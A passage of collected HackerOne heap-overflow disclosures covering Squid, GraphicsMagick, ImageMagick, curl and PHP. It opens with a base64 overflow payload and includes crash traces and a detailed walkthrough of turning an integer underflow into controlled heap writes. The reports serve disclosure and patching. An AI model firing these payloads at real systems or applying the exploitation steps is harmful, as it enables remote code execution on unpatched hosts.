QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
```

## Supporting Material/References:
http://www.squid-cache.org/Advisories/SQUID-2019_5.txt
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12527

## Impact

In my repo it simply will decode A's to the heap overflowing adjacent objects. Since this data is base64 decoded there are no restrictions on the data the attacker can overflow the heap with. The attacker is also able to control how much they overflow the heap by allowing for finer control of their attack.

An attacker could use this to get remote code execution by overflowing an adjacent virtual table, or other crititcal heap memeber to work their way to remote code execution.

---

### [CVE-2020-10938-buffer overflow/out-of-bounds write in compress.c:HuffmanDecodeImage()](https://hackerone.com/reports/816637)

- **Report ID:** `816637`
- **Severity:** Critical
- **Weakness:** Heap Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @nathaniellives
- **Bounty:** - usd
- **Disclosed:** 2021-08-22T03:54:00.533Z
- **CVE(s):** CVE-2020-10938

**Vulnerability Information:**

Hello,
  
 There is an out-of-bounds write that is likely exploitable while performing Huffman decoding of Fax images.
 The technical details are as follows.
  
 # Type: integer underflow produces out of bounds heap/etc write
 # Platform: 32-bit
 # Details:
  
```
 390 MagickExport MagickPassFail HuffmanDecodeImage(Image *image)
 391 {
 392 const HuffmanTable
 393 *entry;
 394
 [...]
 412
 413 long
 414 count,
 415 y;
 416
 [...]
 420 register long
 421 i,
 422 x;
 423
 [...]
 462 InitializeHashTable(mw_hash,TWTable,MWHashA,MWHashB);
 463 InitializeHashTable(mw_hash,MWTable,MWHashA,MWHashB);
 464 InitializeHashTable(mw_hash,EXTable,MWHashA,MWHashB);
 465 InitializeHashTable(mb_hash,TBTable,MBHashA,MBHashB);
 466 InitializeHashTable(mb_hash,MBTable,MBHashA,MBHashB);
 467 InitializeHashTable(mb_hash,EXTable,MBHashA,MBHashB);
  ```
 Basic initialization; of specific note are that the variables 'x' and 'count' are signed. On a 64-bit
 platform, assuming GCC or similar, it is 8 bytes in length and of course 4 bytes in length on 32-bit. There
 is nothing inherently restricting this to 32-bit other than practicalities of the file size as there is a
 need to have backing data to trigger the vulnerability. On 64-bit platforms this equates to a file size that
 exceeds the default maximums, whereas on 32-bit the attached Proof-of-Concept out-of-bounds write trigger
 only requires a file of a few megabytes-- which to my understanding can be reduced by wrapping the file in
 compression.
  
 Additionally, the Huffman hash tables have code lengths that range between 0 and 2560.
  
 ``` 
 495 color=True;
 496 code=0;
 497 count=0;
 498 length=0;
 499 runlength=0;
 500 x=0;
 501 for ( ; ; )
 502 {
 503 if (byte == EOF)
 504 break;
 505 if (x >= (long) image->columns)
 506 {
 507 while (runlength < 11)
 508 InputBit(bit);
 509 do { InputBit(bit); } while (bit == 0);
 510 break;
 511 }
 512 bail=False;
 513 do
 514 {
 515 if (runlength < 11)
 516 InputBit(bit)
 517 else
 518 {
 519 InputBit(bit);
 520 if (bit)
 521 {
 522 null_lines++;
 523 if (x != 0)
 524 null_lines=0;
 525 bail=True;
 526 break;
 527 }
 528 }
 529 code=(code << 1)+bit;
 530 length++;
 531 } while (code <= 0);
 532 if (bail)
 533 break;
 534 if (length > 13)
 535 {
 536 while (runlength < 11)
 537 InputBit(bit);
 538 do
 539 {
 540 InputBit(bit);
 541 } while (bit == 0);
 542 break;
 543 }
 544 if (color)
 545 {
 546 if (length < 4)
 547 continue;
 548 entry=mw_hash[((length+MWHashA)*(code+MWHashB)) % HashSize];
 549 }
 550 else
 551 {
 552 if (length < 2)
 553 continue;
 554 entry=mb_hash[((length+MBHashA)*(code+MBHashB)) % HashSize];
 555 }
 556 if (!entry)
 557 continue;
 558 if ((entry->length != length) || (entry->code != code))
 559 continue;
  ```

 In the above code, we enter an unbounded for() loop at line 501, which terminates upon file EOF or other
 abnormal condition. lines 513-531 unpack a huffman encoded pixel one bit at a time. Once the first binary 1
 is encountered, the loop will always terminate until the total length of the code exceeds 13 or a
 corresponding entry in the huffman tables are found at lines 548 or 554.
  
 In other words, we unpack the pixels and look them up in the huffman tables. Once we encounter a one, we
 terminate the loop and attempt to look up the symbol in the corresponding tables matching the symbol length
 and the symbol code. If we don't find a match, then we restart the loop and unpack another bit. This
 continues until a symbol is found or a sequence of 11 or more zeros or 13 or more bits is encountered.

```  
 560 switch (entry->id)
 561 {
 562 case TWId:
 563 case TBId:
 564 {
 565 count+=entry->count;
 566 if ((x+count) > (long) image->columns)
 567 count=(long) image->columns-x;
 568 if (count > 0)
 569 {
 570 if (color)
 571 {
 572 x+=count;
 573 count=0;
 574 }
 575 else
 576 for ( ; count > 0; count--)
 577 scanline[x++]=1;
 578 }
 579 color=!color;
 580 break;
 581 }
 582 case MWId:
 583 case MBId:
 584 case EXId:
 585 {
 586 count+=entry->count;
 587 break;
 588 }
  ```

 When a symbol is found, we enter a jump table dependant upon the symbol type. The crux of the problem exists
 in this section. The bounds check at line 566: "if ((x+count) > (long) image->columns)" is insufficient due
 to the variables being signed, thus it becomes possible to:
 1 Iterate across TWId or TBId symbols incrementing the value of x such that x is non-zero but less than
 image->columns
 2 Provide repeated instance of MWid, MBId or EXId symbols to iteratively work the "count" variable into a
 value close to but not exceeding INT_MAX
 3 Provide another TWId or TBId symbol causing an additive overflow at line 566.
 4 Depending upon the state of the variable 'color', this will either result in:
 ⋅⋅4 The x variable becoming negative yielding an invalid offset at line 577; or
 ⋅⋅4 Resulting in an invalid value of count which exceeds the image->columns and thus bounding of scanline,
 resulting in an out-of-bounds write at lines 577 and 578

```  
 592 code=0;
 593 length=0;
 594 }
 [...]
```  
 
 # Proof-of-Concept:
  
 Attached is a simple C++ program that when build (make; assuming g++ is in your path) and run will output a
 file 'poc.fax' that can then be supplied to any code path that causes
 ReadImage()->ReadFAXImage()->HuffmanDecodeImage() to be executed. It works the 'x' variable up to a value of
 64, then the count variable up to INT_MAX - 64, then provides one of the symbols with a count length of 0 to
 make x negative and then fetches a symbol that results in the out-of-bounds write.

# Vendor Response

Justin,

This problem (and a number of other issues observed in compress.c) are
addressed by Mercurial changeset 16131:95abc2b694ce.

Thank you very much for your detailed report.

Bob

## Impact

Exploitability:
  
 At first blush, this appears to be a wild out-of-bounds write with relatively little control. However, the
 check at line 568 allows us a finer grained control over circumstances. Notably, it becomes possible to skip
 over uncontrolled writes and toggle the color variable, the user can then supply additional MWId, MBId or
 EXId symbols, causing the value of count to become non-negative, which in tandem with the color toggle
 allows arbitrary modification of the x variable which in turn allows for a finer controlled write. The only
 bounding is the maximum file size to be processed with each iteration taking approximately 1.3 megabytes of
 huffman codes which can be compressed and should compress down nicely.
  
 In other words, you can set the value of x, then increment count into a negative value and toggle the color
 variable back then increment count until its value is sane/positive again, and then re-enter the TWId/TBId
 section thereby modifying the x variable again, then increment count into a negative and toggle color again
 and overall repeat. This would ultimately allow writes as fine grained as a single byte immediately after or
 immediately before the scanline buffer and within a certain range outside of that bounding. As this is heap
 memory, it is thought to readily lend itself to exploitability.
  
 Finally, because this would allow for the modification of heap metadata, e.g. block sizes and similar,
 because both the encoded and decoded data is user controlled without any real constraints and because all
 code paths will trigger a free condition, exploitibility seems more a matter of academic interest than a
 legitimate question.
  
 The specifics of this can be begrudingly worked out if required.

---

### [Heap buffer overflow vulnerability while processing a malformed TIFF file.](https://hackerone.com/reports/1047086)

- **Report ID:** `1047086`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @hardik05
- **Bounty:** - usd
- **Disclosed:** 2021-07-09T20:21:02.894Z
- **CVE(s):** CVE-2020-27829

**Vulnerability Information:**

A heap buffer overflow vulnerability occurs in magick while processing of a malformed TIFF file.Following is the version/build details:
```
$ magick -version
Version: ImageMagick 7.0.10-45 Q16 x86_64 2020-11-30 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): freetype jbig jng jpeg lcms lzma png raw tiff webp x zlib
```

Replication details:
1. run following command with attached poc.tif file:
```
magick poc.tif /dev/null
```
note: zip file password is infected.

you should see the crash as mentioned below.

Following is the crash details:
```
=21316==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6110000004f8 at pc 0x5638f9a55850 bp 0x7fffc92d67b0 sp 0x7fffc92d67a0
READ of size 1 at 0x6110000004f8 thread T0
    #0 0x5638f9a5584f in PushQuantumPixel MagickCore/quantum-import.c:256
    #1 0x5638f9a5584f in ImportRGBQuantum MagickCore/quantum-import.c:4105
    #2 0x5638f9b13e3d in ImportQuantumPixels MagickCore/quantum-import.c:4775
    #3 0x5638f82186f4 in ReadTIFFImage coders/tiff.c:2025
    #4 0x5638f8720e14 in ReadImage MagickCore/constitute.c:563
    #5 0x5638f872e40c in ReadImages MagickCore/constitute.c:953
    #6 0x5638fb49c996 in CLINoImageOperator MagickWand/operation.c:4853
    #7 0x5638fb4aae31 in CLIOption MagickWand/operation.c:5350
    #8 0x5638fae155ca in ProcessCommandOptions MagickWand/magick-cli.c:424
    #9 0x5638fae1ec23 in MagickImageCommand MagickWand/magick-cli.c:796
    #10 0x5638fae26a0e in MagickCommandGenesis MagickWand/mogrify.c:191
    #11 0x5638f63ddab5 in MagickMain utilities/magick.c:149
    #12 0x7f5d91238bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)
    #13 0x5638f63da6e9 in _start (/usr/local/bin/magick+0x20f26e9)

0x6110000004f8 is located 0 bytes to the right of 248-byte region [0x611000000400,0x6110000004f8)
allocated by thread T0 here:
    #0 0x7f5d94f5bb40 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb40)
    #1 0x5638f655c2a8 in AcquireQuantumMemory MagickCore/memory.c:649

SUMMARY: AddressSanitizer: heap-buffer-overflow MagickCore/quantum-import.c:256 in PushQuantumPixel
Shadow bytes around the buggy address:
  0x0c227fff8040: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa
  0x0c227fff8050: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x0c227fff8060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c227fff8070: 06 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c227fff8080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c227fff8090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00[fa]
  0x0c227fff80a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c227fff80b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c227fff80c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c227fff80d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c227fff80e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==21316==ABORTING
```

## Impact

can crash the software, may be remote code execution but i haven't checked the exploitability part of it.

---

### [libcurl: SMTP end-of-response out-of-bounds read - CVE-2019-3823](https://hackerone.com/reports/518097)

- **Report ID:** `518097`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** curl
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2021-01-08T15:07:44.864Z
- **CVE(s):** CVE-2019-3823

**Vulnerability Information:**

```
libcurl contains a heap out-of-bounds read in the code handling the
end-of-response for SMTP.

If the buffer passed to `smtp_endofresp()` isn't NUL terminated and contains
no character ending the parsed number, and `len` is set to 5, then the
`strtol()` call reads beyond the allocated buffer. The read contents will not
be returned to the caller.
```

The issue was reported to the project on 18 January 2019.
A patch was sent to me on 19 January 2019. 
curl 7.64.0 was released on 6 January 2019.

https://curl.haxx.se/docs/CVE-2019-3823.html

## Impact

If the buffer passed to `smtp_endofresp()` isn't NUL terminated and contains no character ending the parsed number, and `len` is set to 5, then the `strtol()` call reads beyond the allocated buffer.

---

### [Heap overflow in utf32be_mbc_to_code](https://hackerone.com/reports/476168)

- **Report ID:** `476168`
- **Severity:** Critical
- **Weakness:** Heap Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @haquaman
- **Bounty:** 1500 usd
- **Disclosed:** 2020-11-09T01:48:51.477Z
- **CVE(s):** CVE-2019-9023

**Vulnerability Information:**

https://bugs.php.net/bug.php?id=77418

